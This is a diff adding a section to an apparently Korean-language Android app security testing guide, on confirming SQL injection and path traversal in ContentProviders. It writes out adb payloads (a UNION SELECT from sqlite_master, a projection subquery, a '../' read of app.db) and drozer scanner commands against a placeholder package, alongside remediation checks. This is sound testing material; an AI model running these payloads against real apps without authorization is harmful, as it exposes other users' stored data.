@@ -292,6 +292,39 @@ adb shell content read --uri content://com.example.target.files/public/test-fixt
 
 SQL Injection이나 Path Traversal은 광범위한 dump보다 fixture 한 건의 범위 이탈로 확인한다. 저장 데이터의 민감도는 [Android 데이터 저장](./data-storage-android.md)과 연결한다.
 
+#### Injection·Path Traversal 확인
+
+`query()`가 `selection`이나 projection을 그대로 SQL에 넣거나, `openFile()`이 경로를 정규화하지 않으면 권한 밖 데이터·파일에 도달할 수 있다. 광범위한 dump 대신 schema 노출 또는 fixture 밖 파일 한 건으로 **범위 이탈만** 입증한다.
+
+selection(`--where`)에 조건을 주입해 다른 row나 내부 schema가 나오는지 본다. UNION 컬럼 수는 대상 projection 수에 맞춘다.
+
+```bash
+adb shell content query --uri content://com.example.target.profile/profiles \
+  --where "1=1) UNION SELECT name,sql FROM sqlite_master--"
+```
+
+projection 자리에 서브쿼리·함수가 들어가는지도 확인한다.
+
+```bash
+adb shell content query --uri content://com.example.target.profile/profiles \
+  --projection "(SELECT sql FROM sqlite_master LIMIT 1)"
+```
+
+file-backed Provider는 `../`로 허용 root를 벗어나는지 본다.
+
+```bash
+adb shell content read --uri "content://com.example.target.files/public/../../databases/app.db"
+```
+
+drozer 스캐너는 후보 탐지 보조로만 쓰고, 결과는 `UriMatcher` 경로와 실제 코드로 교차 확인한다.
+
+```text
+dz> run scanner.provider.injection -a com.example.target
+dz> run scanner.provider.traversal -a com.example.target
+```
+
+`sqlite_master` 내용이 나오거나 fixture 밖 파일이 열리면 범위 이탈 확정이다. 권한 없는 다른 사용자 레코드를 대량 조회하지 말고, selection/projection에 들어가는 입력이 parameterized인지와 `openFile()`의 canonical path 검증을 코드에서 함께 확인한다.
+
 ### URI Grant
 
 `android:grantUriPermissions="true"`는 Provider를 전체 공개하는 설정이 아니다. `exported="false"`인 FileProvider도 특정 앱에 특정 URI를 임시 공유하기 위해 사용할 수 있다.
